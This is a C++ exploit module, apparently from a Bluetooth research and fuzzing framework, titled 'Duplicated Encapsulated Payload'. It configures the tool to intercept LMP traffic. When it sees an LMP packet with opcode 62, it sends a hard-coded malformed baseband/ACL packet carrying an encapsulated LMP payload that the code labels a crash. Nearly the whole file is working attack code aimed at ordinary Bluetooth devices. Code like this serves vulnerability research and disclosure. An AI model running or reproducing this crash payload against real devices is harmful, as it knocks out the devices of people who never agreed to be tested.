#include "ModulesInclude.hpp"
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>

// Filters

// Vars

// Setup
static const char *module_name()
{
    return "Duplicated Encapsulated Payload";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

// Duplicated Encapsulated Payload Crash
static uint8_t packet[] = {0x99, 0x3, 0x8f, 0x0,               // Baseband + ACL Header
                           0x7c, 0x8c, 0x15, 0x48, 0x84, 0xc8, // LMP Encapsulated Payload
                           0x56, 0xcc, 0x0, 0x53, 0x25, 0xc7, 0x5, 0x6d,
                           0x20, 0xe8, 0xf7, 0x9};

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    pkt_buf[2] = pkt_buf[2] & 0b00000111;
    pkt_buf[2] = pkt_buf[2] | (1 << 3);

    if (p && pkt_length > 4 && ((pkt_buf[4] >> 1) == 62)) {
        module_request_t *m = (module_request_t *)p;
        m->tx_count = 1;
        m->pkt_buf = packet;
        m->pkt_len = sizeof(packet);
        wd_log_y("Sending Encapsulated Payload right now!!!");
    }
    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}